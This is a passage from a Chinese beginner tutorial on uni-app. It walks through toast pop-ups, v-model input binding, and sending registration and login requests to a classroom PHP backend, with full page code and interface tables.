punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">showToast</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span><span class="token string">'注册成功'</span><span class="token punctuation">,</span><span class="token literal-property property">icon</span><span class="token operator">:</span><span class="token string">'success'</span><span class="token punctuation">,</span><span class="token literal-property property">duration</span><span class="token operator">:</span><span class="token number">3000</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们在signup方法中调用了一个<code>uni.showToast</code>API，这个API的作用是弹出一个提示框，你需要的能够想到的任何API官方都会提供，你只需把参数设置一下就可以了，比如<code>duration</code>表示持续的时间，改改看看会有什么不同。<br>API是官方提供给我们的接口，他会有详细的手册供我们使用，放心，一定会简单到菜鸡都会用，如果太难了大家都不会，他怎么赚钱？<br>我们不需要知道他究竟是什么原理，我们只是应用程序的开发者，只需要会用就行了，就像你买了一个车子，车子的厂家提供了一些接口给你，就是方向盘刹车等等，虽然我们可能还是要经过简单的学习，但车子内部什么原理你绝对不需要了解，你又不是造车的，也不是修车的，当然，在程序界里造车的都是大佬，造车的人和开车的人的工资水平肯定不是一样的，造车明显难度大很多，当然工资也很高很高。</p><h2 id="24-v-model数据双向绑定"><a href="#24-v-model数据双向绑定" class="headerlink" title="24.v-model数据双向绑定"></a>24.v-model数据双向绑定</h2><p>好像又扯远了，咱们这个程序好像还不行吧，咱们还没注册呢，怎么可能直接就显示注册成功了，我们还需要发送请求到后端，如果我们发送的数据满足后端的条件，那么后端应该会告诉我们注册成功，那样我们才是真的注册成功了，有同学可能又着急了，那搞清楚了，就赶紧发请求呗，磨叽啥。<br>我只想说，你发请求，发什么过去，你连用户输入的数据都还没有收集呢，那么怎么收集用户的数据呢？那先看我操作，再给你们解释。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入用户名<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nihao()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>你好<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token function">nihao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// alert('你好')</span>uni<span class="token punctuation">.</span><span class="token function">showToast</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span><span class="token literal-property property">duration</span><span class="token operator">:</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token literal-property property">icon</span><span class="token operator">:</span><span class="token string">'loading'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">input</span><span class="token punctuation">{</span><span class="token property">border</span><span class="token punctuation">:</span> 1px solid black<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>v-model是将输入框和data中的数据实现双向绑定，因为我们知道数据都是保存在变量里的，相当于就是弄了个变量来保存输入框中输入的数据。<br>但是你怎么知道输入的数据有没有保存到data中呢，还记得刚才我们不是有一个提示框吗？我们就把用户名输入框的数据<code>username</code>当作输入框的标题文字吧，但是记得前面要加this，这个问题比较复杂一些，涉及到底层的原因，你就理解this代表这个页面，<code>this.username</code>就表示这个页面上的<code>username</code>变量。</p><h2 id="25-发送请求（注册页面完整代码）"><a href="#25-发送请求（注册页面完整代码）" class="headerlink" title="25.发送请求（注册页面完整代码）"></a>25.发送请求（注册页面完整代码）</h2><p>再发请求之前，我们还要先去看一下后端程序员的文档。<br>那个所谓的后端程序员其实就是我，没人给你们写后端，你们前端也练不了，网上肯定没有人会提供后端给你们练习，一是这玩意写着非常累，花时间，二是容易被攻击，服务器的运行成本也高，三是还得备案，特别麻烦。所以你过了这村没这店，你要是现在不学，以后也几乎没有机会学了，况且我还随叫随到，你一个标点符号写错了，我弯着腰一行一行给你找，眼睛都看花了，以后工作了公司里谁会这样帮你，其实你和程序员有没有缘分现在几乎也能看出来了，八九不离十，现在这样保姆式教学都不学，以后难了，唉，以后的路自己走吧，言尽于此，估计不想学习的也不会看到这里，说实话，我是一个字一个字敲到这里的，要敲很多天，真的很累，你们可能一天就看到这了，我真尽力了，且行且珍惜吧。</p><table><thead><tr><th>请求地址</th><th>请求方式</th></tr></thead><tbody><tr><td><a href="http://10.163.72.39:5555/Signup_add.php">http://10.163.72.39:5555/Signup_add.php</a></td><td>get</td></tr></tbody></table><table><thead><tr><th align="left">字段名称</th><th>类型及长度</th><th align="left">是否必需</th><th>默认值</th></tr></thead><tbody><tr><td align="left">username</td><td>char(100)</td><td align="left">是</td><td>无</td></tr><tr><td align="left">password</td><td>char(100)</td><td align="left">是</td><td>无</td></tr><tr><td align="left">cpassword</td><td>char(100)</td><td align="left">是</td><td>无</td></tr></tbody></table><table><thead><tr><th>返回参数</th><th>字段</th></tr></thead><tbody><tr><td>msg</td><td>错误提示信息</td></tr><tr><td>error</td><td>错误状态标志，1为错误，0为无误</td></tr></tbody></table><p>接下来怎么发送请求呢？我们先看一下官方给的参考示例吧。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">uni<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">'https://www.example.com/request'</span><span class="token punctuation">,</span> <span class="token comment">//仅为示例，并非真实接口地址。</span>    <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'uni.request'</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token literal-property property">header</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token string-property property">'custom-header'</span><span class="token operator">:</span> <span class="token string">'hello'</span> <span class="token comment">//自定义请求头信息</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'request success'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很多同学这个格式写不对，经常多一个逗号少一个逗号的，其实你就在官方给的样例上修改就行了，这样格式就不会错了。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 网页主体 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section flex_row<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">justify-content</span><span class="token punctuation">:</span> space-around<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>用户注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>Hi、请注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入账号<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>确认密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cpassword<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请再次输入密码<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>signup()<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login_button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span><span class="token literal-property property">cpassword</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 注册</span><span class="token function">signup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"http://10.163.72.39:5555/Signup_add.php"</span><span class="token punctuation">,</span> <span class="token comment">//仅为示例，并非真实接口地址。</span>    <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">,</span><span class="token literal-property property">cpassword</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cpassword    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token literal-property property">header</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token string-property property">"custom-header"</span><span class="token operator">:</span> <span class="token string">"hello"</span> <span class="token comment">//自定义请求头信息</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>error<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">showToast</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">,</span><span class="token literal-property property">duration</span><span class="token operator">:</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token literal-property property">icon</span><span class="token operator">:</span><span class="token string">'error'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">showToast</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">,</span><span class="token literal-property property">duration</span><span class="token operator">:</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token literal-property property">icon</span><span class="token operator">:</span><span class="token string">'success'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.login_button</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 50vw<span class="token punctuation">;</span><span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.login_button:hover</span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> aquamarine<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">input</span><span class="token punctuation">{</span><span class="token property">border</span><span class="token punctuation">:</span> 1px solid black<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 25vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_secition</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkseagreen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子横着排 */</span><span class="token selector">.flex_row</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token comment">/*排列方向：横向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子竖着排 */</span><span class="token selector">.flex_column</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token comment">/*排列方向：纵向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="26-发送登录请求"><a href="#26-发送登录请求" class="headerlink" title="26.发送登录请求"></a>26.发送登录请求</h2><p>注册成功了之后怎么验证呢？那当然是去登录一下咯，如果你能用你刚才注册好的账号登录，就说明注册的时候信息已经提交到数据库了。</p><p>我们来看一下登录接口的后端文档吧</p><table><thead><tr><th>请求地址</th><th>请求方式</th></tr></thead><tbody><tr><td><a href="http://10.163.72.39:5555/Login_get.php">http://10.163.72.39:5555/Login_get.php</a></td><td>get</td></tr></tbody></table><table><thead><tr><th align="left">字段名称</th><th>类型及长度</th><th align="left">是否必需</th><th>默认值</th></tr></thead><tbody><tr><td align="left">username</td><td>char(100)</td><td align="left">是</td><td>无</td></tr><tr><td align="left">password</td><td>char(100)</td><td align="left">是</td><td>无</td></tr></tbody></table><table><thead><tr><th>返回参数</th><th>字段</th></tr></thead><tbody><tr><td>msg</td><td>错误提示信息</td></tr><tr><td>error</td><td>错误状态标志，1为错误，0为无误</td></tr></tbody></table><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 标题栏 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_seciton flex_row<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">justify-content</span><span class="token punctuation">:</span> space-around</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 图片区域 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span 